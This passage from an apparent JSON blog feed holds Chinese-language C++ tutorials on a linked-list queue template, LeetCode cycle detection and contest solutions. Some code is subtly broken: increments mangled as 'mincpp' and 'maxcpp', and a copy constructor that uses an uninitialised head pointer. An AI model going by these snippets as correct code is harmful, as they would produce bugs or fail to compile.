1;\n}\n\n// 复制构造函数\ntemplate&lt;class T&gt;\nQueue&lt;T&gt;::Queue(const Queue&lt;T&gt;&amp; q)\n{\n    node&lt;T&gt;*newp = q.head;\n    while (newp!= nullptr)\n    {\n        node&lt;T&gt;* newnode = new node&lt;T&gt;;\n        newnode-&gt;data = newp-&gt;data;\n        newnode-&gt;next = nullptr;\n        if (head == nullptr)\n        {\n            head = tail = newnode;\n            num = 1;\n        }\n        else\n        {\n            tail-&gt;next = newnode;\n            tail = tail-&gt;next;\n            num++;\n        }\n        newp = newp-&gt;next;\n    }\n\n}\n</code></pre>\n<h4 id=\"析构函数\"><a href=\"#析构函数\" class=\"headerlink\" title=\"析构函数\"></a>析构函数</h4><p>由于存储数据申请了空间，那么析构函数应当执行释放内存操作</p>\n<p>代码如下：</p>\n<pre><code class=\"c++\">template&lt;class T&gt;\nQueue&lt;T&gt;::~Queue()\n{\n    while (head != nullptr)\n    {\n        node&lt;T&gt;* temp = head;\n        head = head-&gt;next;\n        delete temp;\n    }\n    tail = nullptr;\n    num = 0;\n}\n</code></pre>\n<h4 id=\"push-T-val\"><a href=\"#push-T-val\" class=\"headerlink\" title=\"push(T val)\"></a>push(T val)</h4><p>由于$push_back()$即为链表中的尾插，那么只需创建新的结点，存储数值，之后使当前$tail$的$next$指向该结点，最后$tail$指向该结点即可。需要注意的是，如果队列中无元素，那么直接将$head$和$tail$指向该结点即可</p>\n<pre><code class=\"c++\">template&lt;class T&gt;\nvoid Queue&lt;T&gt;::push(T val)\n{\n    node&lt;T&gt;* newnode = new node&lt;T&gt;;\n    newnode-&gt;data = val;\n    newnode-&gt;next = nullptr;\n    if (head == nullptr)        // 无元素，或者可以写成 tail==nullptr 或 num==0\n    {\n        head = tail = newnode;\n        num = 1;\n    }\n    else\n    {\n        tail-&gt;next = newnode;\n        tail = tail-&gt;next;\n        num++;\n    }\n}\n</code></pre>\n<h4 id=\"pop\"><a href=\"#pop\" class=\"headerlink\" title=\"pop()\"></a>pop()</h4><p>所做的操作为头删</p>\n<p>在删之前，我们必须考虑队列为空的情况，因此可以使用$assert()$进行判断报错</p>\n<p>当队列中有元素时，删去头结点，那么可以先创建一个结点指针指向头结点，在删去头结点后再令<code>head=head-&gt;next</code>，<code>num--</code></p>\n<pre><code class=\"c++\">template&lt;class T&gt;\nvoid Queue&lt;T&gt;::pop()\n{\n    assert(head);\n    node&lt;T&gt;*temp = head;\n    head = head-&gt;next;\n    delete temp;     // 删去 head 也可以，只不过上面的 head 赋值需换到下面写成 head=temp-&gt;next;\n    num--;\n}\n</code></pre>\n<h4 id=\"back\"><a href=\"#back\" class=\"headerlink\" title=\"back()\"></a>back()</h4><p>返回队尾元素，直接使用$tail$指针即可</p>\n<pre><code class=\"c++\">template&lt;class T&gt;\nT Queue&lt;T&gt;::back()\n{\n    return tail-&gt;data;\n}\n</code></pre>\n<h4 id=\"front\"><a href=\"#front\" class=\"headerlink\" title=\"front()\"></a>front()</h4><p>返回队首元素，直接使用$head$指针即可</p>\n<pre><code class=\"c++\">template&lt;class T&gt;\nT Queue&lt;T&gt;::front()\n{\n    return head-&gt;data;\n}\n</code></pre>\n<h4 id=\"operator-x3D-const-Queue-amp-q\"><a href=\"#operator-x3D-const-Queue-amp-q\" class=\"headerlink\" title=\"operator=(const Queue&amp;q)\"></a>operator=(const Queue<t>&amp;q)</t></h4><p>与复制构造函数类似，但这里需要判断原Queue对象是否已经有队列元素</p>\n<pre><code class=\"c++\">// 重载 = 运算符\ntemplate&lt;class T&gt;\nvoid Queue&lt;T&gt;::operator =(const Queue&lt;T&gt;&amp; q)\n{\n    if (head)             // 如果存在队列\n    {\n        this-&gt;~Queue();\n    }\n    node&lt;T&gt;*newp = q.head;\n    while (newp != nullptr)\n    {\n        node&lt;T&gt;* newnode = new node&lt;T&gt;;\n        newnode-&gt;data = newp-&gt;data;\n        newnode-&gt;next = nullptr;\n        if (head == nullptr)\n        {\n            head = tail = newnode;\n            num = 1;\n        }\n        else\n        {\n            tail-&gt;next = newnode;\n            tail = tail-&gt;next;\n            num++;\n        }\n        newp = newp-&gt;next;\n    }\n}\n</code></pre>\n<h4 id=\"print\"><a href=\"#print\" class=\"headerlink\" title=\"print()\"></a>print()</h4><p>即遍历链表，打印队列</p>\n<p>较为简单，直接上代码:</p>\n<pre><code class=\"c++\">template&lt;class T&gt;\nvoid Queue&lt;T&gt;::print()\n{\n    node&lt;T&gt;* temp = head;\n    while (temp != nullptr)\n    {\n        cout &lt;&lt; temp-&gt;data &lt;&lt; \"  \";\n        temp = temp-&gt;next;\n    }\n    cout &lt;&lt; endl;\n}\n</code></pre>\n<h4 id=\"empty\"><a href=\"#empty\" class=\"headerlink\" title=\"empty()\"></a>empty()</h4><p>判断是否为空，即可判断$n==0?$</p>\n<pre><code class=\"c++\">template&lt;class T&gt;\nbool Queue&lt;T&gt;::empty()\n{\n    return num == 0;\n}\n</code></pre>\n<h4 id=\"size\"><a href=\"#size\" class=\"headerlink\" title=\"size()\"></a>size()</h4><p>返回队列大小，即为$num$的值</p>\n<pre><code class=\"c++\">template&lt;class T&gt;\nint Queue&lt;T&gt;::size()\n{\n    return num;\n}\n</code></pre>\n<h1 id=\"结果\"><a href=\"#结果\" class=\"headerlink\" title=\"结果\"></a>结果</h1><pre><code class=\"c++\">//#ifndef  _QUEUE_H\n//#define  _QUEUE_H\n\n#include&lt;assert.h&gt;\n#include&lt;iostream&gt;\nusing namespace std;\n\ntemplate&lt;class T&gt;\nstruct node{\n    T data;\n    node&lt;T&gt;* next;\n};\n\n\ntemplate&lt;class T&gt;\nclass Queue{\nprivate:\n    node&lt;T&gt;* head;         // 头结点\n    node&lt;T&gt;* tail;         // 尾结点\n    int num;\npublic:\n    Queue();                              // 无参构造函数\n    Queue(T val);                         // 有参构造函数\n    ~Queue();                             // 析构函数\n    Queue(const Queue&lt;T&gt;&amp; q);             // 复制构造函数\n    void push(T val);                     // 入队\n    void pop();                           // 出队\n    T back();                             // 返回队尾元素\n    T front();                            // 返回队首元素\n    void operator =(const Queue&lt;T&gt;&amp; q);   // 重载 = 运算符\n    void print();                         // 打印队列\n    bool empty();                         // 判断是否为空\n    int size();                           // 返回队列大小\n\n};\n\n// 无参构造函数\ntemplate&lt;class T&gt;\nQueue&lt;T&gt;::Queue()\n{\n    head = tail = nullptr;\n    num = 0;\n}\n\n// 有参构造函数\ntemplate&lt;class T&gt;\nQueue&lt;T&gt;::Queue(T val)\n{\n    node&lt;T&gt;* newnode = new node&lt;T&gt;;\n    newnode-&gt;data = val;\n    newnode-&gt;next = nullptr;\n    head = tail = newnode;\n    num = 1;\n}\n\n// 析构函数\ntemplate&lt;class T&gt;\nQueue&lt;T&gt;::~Queue()\n{\n    while (head != nullptr)\n    {\n        node&lt;T&gt;* temp = head;\n        head = head-&gt;next;\n        delete temp;\n    }\n    tail = nullptr;\n    num = 0;\n}\n\n// 复制构造函数\ntemplate&lt;class T&gt;\nQueue&lt;T&gt;::Queue(const Queue&lt;T&gt;&amp; q)\n{\n    node&lt;T&gt;*newp = q.head;\n    while (newp!= nullptr)\n    {\n        node&lt;T&gt;* newnode = new node&lt;T&gt;;\n        newnode-&gt;data = newp-&gt;data;\n        newnode-&gt;next = nullptr;\n        if (head == nullptr)\n        {\n            head = tail = newnode;\n            num = 1;\n        }\n        else\n        {\n            tail-&gt;next = newnode;\n            tail = tail-&gt;next;\n            num++;\n        }\n        newp = newp-&gt;next;\n    }\n\n}\n\n// 入队 (尾插)\ntemplate&lt;class T&gt;\nvoid Queue&lt;T&gt;::push(T val)\n{\n    node&lt;T&gt;* newnode = new node&lt;T&gt;;\n    newnode-&gt;data = val;\n    newnode-&gt;next = nullptr;\n    if (head == nullptr)\n    {\n        head = tail = newnode;\n        num = 1;\n    }\n    else\n    {\n        tail-&gt;next = newnode;\n        tail = tail-&gt;next;\n        num++;\n    }\n}\n\n// 出队 (头删)\ntemplate&lt;class T&gt;\nvoid Queue&lt;T&gt;::pop()\n{\n    assert(head);\n    node&lt;T&gt;*temp = head;\n    head = head-&gt;next;\n    delete temp;\n    num--;\n}\n\n// 返回队尾元素\ntemplate&lt;class T&gt;\nT Queue&lt;T&gt;::back()\n{\n    return tail-&gt;data;\n}\n\n// 返回队首元素\ntemplate&lt;class T&gt;\nT Queue&lt;T&gt;::front()\n{\n    return head-&gt;data;\n}\n\n// 重载 = 运算符\ntemplate&lt;class T&gt;\nvoid Queue&lt;T&gt;::operator =(const Queue&lt;T&gt;&amp; q)\n{\n    if (head)\n    {\n        this-&gt;~Queue();\n    }\n    node&lt;T&gt;*newp = q.head;\n    while (newp != nullptr)\n    {\n        node&lt;T&gt;* newnode = new node&lt;T&gt;;\n        newnode-&gt;data = newp-&gt;data;\n        newnode-&gt;next = nullptr;\n        if (head == nullptr)\n        {\n            head = tail = newnode;\n            num = 1;\n        }\n        else\n        {\n            tail-&gt;next = newnode;\n            tail = tail-&gt;next;\n            num++;\n        }\n        newp = newp-&gt;next;\n    }\n}\n\n// 打印队列\ntemplate&lt;class T&gt;\nvoid Queue&lt;T&gt;::print()\n{\n    node&lt;T&gt;* temp = head;\n    while (temp != nullptr)\n    {\n        cout &lt;&lt; temp-&gt;data &lt;&lt; \"  \";\n        temp = temp-&gt;next;\n    }\n    cout &lt;&lt; endl;\n}\n\n// 判断队列是否为空\ntemplate&lt;class T&gt;\nbool Queue&lt;T&gt;::empty()\n{\n    return num == 0;\n}\n\n// 返回队列大小\ntemplate&lt;class T&gt;\nint Queue&lt;T&gt;::size()\n{\n    return num;\n}\n//#endif\n</code></pre>\n",
            "tags": [
                "数据结构",
                "队列"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/45daaf11/",
            "url": "http://dpm12345.cn/posts/45daaf11/",
            "title": "环形链表",
            "date_published": "2021-12-31T11:54:40.000Z",
            "content_html": "<h1 id=\"环形链表\"><a href=\"#环形链表\" class=\"headerlink\" title=\"环形链表\"></a>环形链表</h1><p>题目链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvbGlua2VkLWxpc3QtY3ljbGUv\">环形链表</span></p>\n<p>题目详情：</p>\n<p><img data-src=\"/../../../post_images/%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%85.png\"></p>\n<h2 id=\"利用哈希表\"><a href=\"#利用哈希表\" class=\"headerlink\" title=\"利用哈希表\"></a>利用哈希表</h2><p><strong>方法详情：</strong>由于如果一个链表是环形链表，那么在不断地跳入下一个结点坐标时，其地址必然与前面d的某个地址相同，也就是说，我们可以把每个结点的地址存入哈希表中，当出现要存入结点地址已经在哈希表中存过之后，那么该链表必然是环形链表，否则不是。据此，时间方面，我们可知只需最长只需遍历链表结点一遍；空间方面，我们创建了一个哈希表，最多存入链表的总个数$n$</p>\n<ul>\n<li>时间复杂度$O(n)$</li>\n<li>空间复杂度$O(n)$</li>\n</ul>\n<p>以下为代码：</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    bool hasCycle(ListNode *head) {\n        unordered_map&lt;ListNode*,int&gt;a;\n        while(head!=NULL)\n        {\n            if(a.count(head))\n            return true;\n            a.insert({head,0});\n            head=head-&gt;next;\n        }\n        return false;\n        \n    }\n};\n</code></pre>\n<h2 id=\"利用双指针（快慢指针）\"><a href=\"#利用双指针（快慢指针）\" class=\"headerlink\" title=\"利用双指针（快慢指针）\"></a>利用双指针（快慢指针）</h2><p>题目中的进阶要求我们使用$O(1)$的内存，该方案是可以实现的，具体涉及到双指针方法详情：我们可以创建两个指针，快指针fast，每次走两步，慢指针slow，每次走一步。那么就很容易得到如果该环形链表为环形链表，快指针必定会在环形结点的某一个结点与慢指针相遇(或者说是追上慢指针)，那么只需判断最后两个指针是否指向同一个结点即可</p>\n<p><strong>证明：</strong>在该方法中，使用了分别走一步和两步的指针。如果该链表是环形链表，当慢指针进入环形部分中，此时快指针也在某处，设他们相差$n$个结点，而他们的速度之差为$1$，$n\\quad mod\\quad1==0$ 也就是说，必定存在某一时刻能够使两指针指向同一个地址据此，时间方面，在慢指针进入环形结点后，快慢指针初始相距最长为$L(L&lt;=N)$, 而在此之前遍历次数也只和$N$有关，如果没有环形链表，那么遍历次数为$\\lfloor$$\\frac{n}{2}$$\\rfloor$</p>\n<ul>\n<li>时间复杂度$O(n)$</li>\n<li>空间复杂度$O(1)$</li>\n</ul>\n<p>以下为代码：</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    bool hasCycle(ListNode *head) {\n        ListNode*fast=head,*slow=head;\n        while(fast!=NULL&amp;&amp;fast-&gt;next!=NULL)\n        {\n            fast=fast-&gt;next-&gt;next;\n            slow=slow-&gt;next;\n            if(fast==slow)\n                return true;\n        }\n        return false;\n    }\n};\n</code></pre>\n<h1 id=\"环形链表-II（求出环形链表开始结点位置）\"><a href=\"#环形链表-II（求出环形链表开始结点位置）\" class=\"headerlink\" title=\"环形链表 II（求出环形链表开始结点位置）\"></a>环形链表 II（求出环形链表开始结点位置）</h1><p>题目链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvbGlua2VkLWxpc3QtY3ljbGUtaWkv\">环形链表 II</span></p>\n<p>题目详情：</p>\n<p><img data-src=\"/../../../post_images/%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8II_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%85.png\"></p>\n<p>该题与上面题目比较像，但在确定环的同时也要返回环开始结点</p>\n<h2 id=\"哈希表\"><a href=\"#哈希表\" class=\"headerlink\" title=\"哈希表\"></a>哈希表</h2><p>在上一个问题中，我们是找到重复就返回true，那么同理在这里我们可以使用相同的代码，仅仅把返回值的true和false分别改成对应节点和NULL即可</p>\n<ul>\n<li>时间复杂度$O(n)$</li>\n<li>空间复杂度$O(n)$</li>\n</ul>\n<p>代码如下：</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    ListNode *detectCycle(ListNode *head) {\n        unordered_map&lt;ListNode*,int&gt;a;\n        while(head!=NULL)\n        {\n            if(a.count(head))\n               return head;\n            a.insert({head,1});\n            head=head-&gt;next;\n        }\n        return NULL;\n    }\n};\n</code></pre>\n<h2 id=\"双指针（快慢指针）\"><a href=\"#双指针（快慢指针）\" class=\"headerlink\" title=\"双指针（快慢指针）\"></a>双指针（快慢指针）</h2><p>为了降低内存我们同样也可以使用快慢指针，将空间复杂度降到$O(1)$，这里涉及到一个证明</p>\n<p><img data-src=\"/../../../post_images/%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8II_%E8%AF%81%E6%98%8E.jpg\"></p>\n<p>所以我们可以在双指针基础上，在他们相遇时新建两个指针 (或者直接用现成的<code>head</code>和<code>slow/fast</code>指针，不断往后面走，相遇时得到该位置</p>\n<ul>\n<li>时间复杂度$O(n)$</li>\n<li>空间复杂度$O(1)$</li>\n</ul>\n<p>代码如下：</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    ListNode *detectCycle(ListNode *head) {\n        ListNode *slow=head,*fast=head;\n        while(fast&amp;&amp;fast-&gt;next)\n        {\n            slow=slow-&gt;next;\n            fast=fast-&gt;next-&gt;next;\n            if(slow==fast)\n            {\n                ListNode* start=head,*meet=slow;\n                while(start!=meet)\n                {\n                    start=start-&gt;next;\n                    meet=meet-&gt;next;\n                }\n                return meet;\n            }\n        }\n        return NULL;\n        \n    }\n};\n</code></pre>\n",
            "tags": [
                "哈希表",
                "链表",
                "双指针（快慢指针）"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/274338ea/",
            "url": "http://dpm12345.cn/posts/274338ea/",
            "title": "leetcode 第 68 场双周赛",
            "date_published": "2021-12-28T15:20:34.000Z",
            "content_html": "<p>【战绩】</p>\n<p><img data-src=\"/../../../post_images/leetcode%E7%AC%AC68%E5%9C%BA%E5%8F%8C%E5%91%A8%E8%B5%9B_%E6%88%98%E7%BB%A9.png\"></p>\n<p>总结:</p>\n<p>此次双周赛的成绩，看排名似乎还行，但事实上只在限定时间内做出了第一题，可以说是不太好。总的来说是，接触过的题目太少，知识储备不够造成的，因此之后的策略是涉及多方面的题目、知识与解法</p>\n<p>总结到此，下面是题目解析</p>\n<h1 id=\"句子中的最多单词数\"><a href=\"#句子中的最多单词数\" class=\"headerlink\" title=\"句子中的最多单词数\"></a>句子中的最多单词数</h1><p>题目链接:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvbWF4aW11bS1udW1iZXItb2Ytd29yZHMtZm91bmQtaW4tc2VudGVuY2VzLw==\">句子中的最多单词数</span></p>\n<p>这题非常简单，计算空格数即可</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    int mostWordsFound(vector&lt;string&gt;&amp; sentences) {\n        int ans=0;\n        for(int i=0;i&lt;sentences.size();i++)\n        {\n            int cur=0;\n            for(int j=0;j&lt;sentences[i].size();j++)\n            {\n                if(sentences[i][j]==' ')\n                    cur++;\n            }\n            ans=max(ans,cur+1);\n        }\n        return ans;\n        \n    }\n};\n</code></pre>\n<h1 id=\"从给定原材料中找到所有可以做出的菜\"><a href=\"#从给定原材料中找到所有可以做出的菜\" class=\"headerlink\" title=\"从给定原材料中找到所有可以做出的菜\"></a>从给定原材料中找到所有可以做出的菜</h1><p>题目链接:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvZmluZC1hbGwtcG9zc2libGUtcmVjaXBlcy1mcm9tLWdpdmVuLXN1cHBsaWVzLw==\"> 从给定原材料中找到所有可以做出的菜</span></p>\n<h2 id=\"暴力法\"><a href=\"#暴力法\" class=\"headerlink\" title=\"暴力法\"></a>暴力法</h2><p>根据题目要求，做好的菜可以作为原材料去做其他的菜，那么想法可以是先遍历一遍，如果发现有菜可以做出来，那么将该菜放入存有材料的哈希表中，重新开始循环，并且避免对已经做出来的菜重复计算，那么循环结束后便得到一个完整原材料的哈希表。最后再遍历一次食谱，得到的结果便是答案。</p>\n<p>以下为我自己写的代码 (原以为在周赛时间限制内，但是实际已经过了)</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    void tj(vector&lt;string&gt;&amp; recipes, vector&lt;vector&lt;string&gt;&gt;&amp; ingredients, vector&lt;string&gt;&amp; supplies,unordered_map&lt;string,int&gt;&amp;a)\n    {\n        int flag=1;       // 判断是否已经是否把所有情况遍历\n        while(flag)\n        {\n            flag=0;      // 假设可以结束了\n            for(int i=0;i&lt;recipes.size();i++)\n            {\n                int j;\n                for(j=0;j&lt;ingredients[i].size();j++)\n                {\n                    if(!a.count(recipes[i])&amp;&amp;!a.count(ingredients[i][j]))   // 发现此菜品不能做出来\n                        break;\n                }\n                \n                // 发现菜品没有统计过并且可以做出来，j==ingredients [i].size () 说明原材料都有\n                if(!a.count(recipes[i])&amp;&amp;j==ingredients[i].size())    \n                {\n                    a[recipes[i]]=1;\n                    flag=1;         // 说明有新材料加入，那么重新遍历菜谱\n                    break;\n                }\n            }\n        }\n    }\n    vector&lt;string&gt; findAllRecipes(vector&lt;string&gt;&amp; recipes, vector&lt;vector&lt;string&gt;&gt;&amp; ingredients, vector&lt;string&gt;&amp; supplies) {\n        unordered_map&lt;string,int&gt;a;\n        vector&lt;string&gt;ans; \n        for(int i=0;i&lt;supplies.size();i++)\n        {\n            a[supplies[i]]=1;         // 原材料放入哈希表\n        }\n        tj(recipes,ingredients,supplies,a);         // 统计新的原材料哈希表\n        for(int i=0;i&lt;recipes.size();i++)\n        {\n            int j;\n            for(j=0;j&lt;ingredients[i].size();j++)\n            {\n                if(!a.count(ingredients[i][j]))\n                        break;\n            }\n            if(j==ingredients[i].size())\n            {\n                ans.push_back(recipes[i]);     // 将满足的菜品放入 ans 中\n            }\n        }\n        return ans;\n    }\n};\n</code></pre>\n<h2 id=\"拓扑排序\"><a href=\"#拓扑排序\" class=\"headerlink\" title=\"拓扑排序\"></a>拓扑排序</h2><p>以下为代码</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    vector&lt;string&gt; findAllRecipes(vector&lt;string&gt;&amp; recipes, vector&lt;vector&lt;string&gt;&gt;&amp; ingredients, vector&lt;string&gt;&amp; supplies) {\n        int n = recipes.size();\n        // 图\n        unordered_map&lt;string, vector&lt;string&gt;&gt; depend;\n        // 入度统计\n        unordered_map&lt;string, int&gt; cnt;\n        for (int i = 0; i &lt; n; ++i) {\n            for (const string&amp; ing: ingredients[i]) {\n                depend[ing].push_back(recipes[i]);\n            }\n            cnt[recipes[i]] = ingredients[i].size();\n        }\n        \n        vector&lt;string&gt; ans;\n        queue&lt;string&gt; q;\n        // 把初始的原材料放入队列\n        for (const string&amp; sup: supplies) {\n            q.push(sup);\n        }\n        // 拓扑排序\n        while (!q.empty()) {\n            string cur = q.front();\n            q.pop();\n            if (depend.count(cur)) {\n                for (const string&amp; rec: depend[cur]) {\n                    --cnt[rec];\n                    // 如果入度变为 0，说明可以做出这道菜\n                    if (cnt[rec] == 0) {\n                        ans.push_back(rec);\n                        q.push(rec);\n                    }\n                }\n            }\n        }\n        return ans;\n    }\n};\n</code></pre>\n<h1 id=\"判断一个括号字符串是否有效\"><a href=\"#判断一个括号字符串是否有效\" class=\"headerlink\" title=\"判断一个括号字符串是否有效\"></a>判断一个括号字符串是否有效</h1><p>题目链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvY2hlY2staWYtYS1wYXJlbnRoZXNlcy1zdHJpbmctY2FuLWJlLXZhbGlkLw==\">判断一个括号字符串是否有效</span></p>\n<h2 id=\"两次遍历，正序遍历和逆序遍历。\"><a href=\"#两次遍历，正序遍历和逆序遍历。\" class=\"headerlink\" title=\"两次遍历，正序遍历和逆序遍历。\"></a>两次遍历，正序遍历和逆序遍历。</h2><p>首先排除奇数个数的情况，因为括号数为奇数时必不可能两两配对</p>\n<p>正序遍历时，用count记录此时不可修改的右括号数，在遍历时时候比对当前数目的右括号数与剩下的最多左括号数，如果后者小于前者，那么不可能经过改变得到有效的括号字符串</p>\n<p>逆序遍历时，同正序遍历时的方法，用count记录此时不可修改左括号数，在遍历时时候比对当前数目的右括号数与剩下的最多左括号数，如果后者小于前者，那么不可能经过改变得到有效的括号字符串</p>\n<p>两次遍历结束后若都不会返回false，那么说明肯定存在一种情况使得左括号与右括号恰好两两配对</p>\n<p>因为一个是$L&gt;=R$另一个是$L&lt;=R$，如果两种都满足则会有相等使其配对的情况，所以最后能得到正确结果</p>\n<p>以下为参考代码</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    bool canBeValid(string s, string locked) {\n        if(s.size()%2==1) return false;\n        int l=0,r=0;\n        for(int i=0;i&lt;s.size();i++)\n        {\n            if(locked[i]=='1'&amp;&amp;s[i]==')')\n                r++;\n            if(i+1-r&lt;r)                  // 最大左括号数小于右括号数\n                return false;\n        }\n        for(int i=s.size()-1;i&gt;=0;i--)\n        {\n            if(locked[i]=='1'&amp;&amp;s[i]=='(')\n                l++;\n            if(s.size()-i-l&lt;l)           // 最大右括号数小于左括号数\n                return false;\n        }\n        return true;\n    }\n};\n</code></pre>\n<h2 id=\"贪心算法：一次遍历，用-maxc-记录最大未匹配数，minc-记录最小未匹配数\"><a href=\"#贪心算法：一次遍历，用-maxc-记录最大未匹配数，minc-记录最小未匹配数\" class=\"headerlink\" title=\"贪心算法：一次遍历，用 maxc 记录最大未匹配数，minc 记录最小未匹配数\"></a>贪心算法：一次遍历，用 maxc 记录最大未匹配数，minc 记录最小未匹配数</h2><p>首先排除奇数个数的情况，因为括号数为奇数时必不可能两两配对</p>\n<p>当遇到不可变的右(左)括号时，<code>maxc</code>和<code>minc</code>都加一(减一), 如果在此期间<code>maxc&lt;0</code>，那么证明有右括号不能被匹配那么这串字符串是无效的</p>\n<p>当遇到可变的位置时，由于既可以变也可以不变，那么<code>maxcpp</code>，<code>minc−−</code>，其中如果<code>minc</code>减之前如果是0，那么<code>minc</code>就变为1，因为会增加</p>\n<p>如果在遍历过程中，<code>minc&gt;maxc</code>，那么证明该串是无效的</p>\n<p>最后如果该串是有效，那么<code>minc</code>必为0，所以返回值为<code>minc==0</code></p>\n<p>以下为代码</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    bool canBeValid(string s, string locked) {\n        if(s.size()%2==1)  return false;\n        int minc=0,maxc=0;\n        for(int i=0;i&lt;s.size();i++)\n        {\n            if(locked[i]=='1')\n            {\n                if(s[i]=='(')\n                {\n                    mincpp;\n                    maxcpp;\n                }\n                if(s[i]==')')\n                {\n                    maxc--;\n                    minc=minc==0?1:minc-1;\n                    if(maxc&lt;0)\n                        return false;\n                }\n            }\n            else\n            {\n                minc=minc==0?1:minc-1;\n                maxcpp;\n            }\n            if(minc&gt;maxc)\n                return false;\n        }\n        return minc==0;\n    }\n};\n</code></pre>\n<h1 id=\"一个区间内所有数乘积的缩写\"><a href=\"#一个区间内所有数乘积的缩写\" class=\"headerlink\" title=\"一个区间内所有数乘积的缩写\"></a>一个区间内所有数乘积的缩写</h1><p>题目链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvYWJicmV2aWF0aW5nLXRoZS1wcm9kdWN0LW9mLWEtcmFuZ2Uv\">一个区间内所有数乘积的缩写</span></p>\n<p>目前学习中……</p>\n",
            "tags": []
        },
        {
            "id": "http://dpm12345.cn/posts/80d31d12/",
            "url": "http://dpm12345.cn/posts/80d31d12/",
            "title": "leetcode 第 273 场周赛",
            "date_published": "2021-12-28T15:20:34.000Z",
            "content_html": "<p>【战绩】</p>\n<p><img data-src=\"/../../../post_images/leetcode%E7%AC%AC273%E5%9C%BA%E5%91%A8%E8%B5%9B_%E6%88%98%E7%BB%A9.png\" alt=\"leetcode第273场周赛_战绩\"></p>\n<p>总结:</p>\n<p>此次周赛，成绩差，只做出来了两题，并且第一题还提交错误一次。总的来说题目看得不够清楚，对题目的 推导还比较欠缺</p>\n<p>总结到此，下面是题目解析</p>\n<h1 id=\"反转两次的数字\"><a href=\"#反转两次的数字\" class=\"headerlink\" title=\"反转两次的数字\"></a>反转两次的数字</h1><p>题目链接:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvYS1udW1iZXItYWZ0ZXItYS1kb3VibGUtcmV2ZXJzYWwv\">反转两次的数字</span></p>\n<p>这道题比较简单，可以直接暴力进行两次数字反转得到答案</p>\n<p>但仔细想想会发现，如果一个数字反转两次后是元素，那么原数字末尾必不为0(0除外) ，因为如果存在0时 在进行反转后0会被删去，数字总位数减少，从而再次进行反转得到的数字必然不会是原来的数字</p>\n<p>以下为代码</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    bool isSameAfterReversals(int num) {\n        return num==0||num%10!=0;\n    }\n};\n</code></pre>\n<h1 id=\"执行所有后缀指令\"><a href=\"#执行所有后缀指令\" class=\"headerlink\" title=\"执行所有后缀指令\"></a>执行所有后缀指令</h1><p>题目链接:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvZXhlY3V0aW9uLW9mLWFsbC1zdWZmaXgtaW5zdHJ1Y3Rpb25zLXN0YXlpbmctaW4tYS1ncmlkLw==\">执行所有后缀指令</span></p>\n<p>按照题目要求模拟即可，注意什么时候是行，什么时候是列即可</p>\n<p>代码如下</p>\n<pre><code class=\"cpp\">class Solution {\npublic:\n    vector&lt;int&gt; executeInstructions(int n, vector&lt;int&gt;&amp; startPos, string s) {\n        vector&lt;int&gt;ans(s.size());\n        for(int i=0;i&lt;s.size();i++)\n        {\n            int j=0,num=0;\n            vector&lt;int&gt;cur=startPos;\n            for(j=i;j&lt;s.size();j++)\n            {\n                if(s[j]=='L'&amp;&amp;cur[1]&gt;0)\n                {\n                    cur[1]--;\n                    num++;\n                }\n                else if(s[j]=='R'&amp;&amp;cur[1]&lt;n-1)\n                {\n                    cur[1]++;\n                    num++;\n                }\n                else if(s[j]=='U'&amp;&amp;cur[0]&gt;0)\n                {\n                    cur[0]--;\n                    num++;\n                }   \n                else if(s[j]=='D'&amp;&amp;cur[0]&lt;n-1)\n                {\n                    cur[0]++;\n                    num++;\n                }\n                else\n                    break;\n            }\n            ans[i]=num;\n            \n        }\n        return ans;\n        \n    }\n};\n</code></pre>\n<h1 id=\"相同元素的间隔之和\"><a href=\"#相同元素的间隔之和\" class=\"headerlink\" title=\"相同元素的间隔之和\"></a>相同元素的间隔之和</h1>",
            "tags": []
        },
        {
            "id": "http://dpm12345.cn/posts/4a8b7903/",
            "url": "http://dpm12345.cn/posts/4a8b7903/",
            "title": "方法总结",
            "date_published": "2021-12-26T02:20:40.000Z",
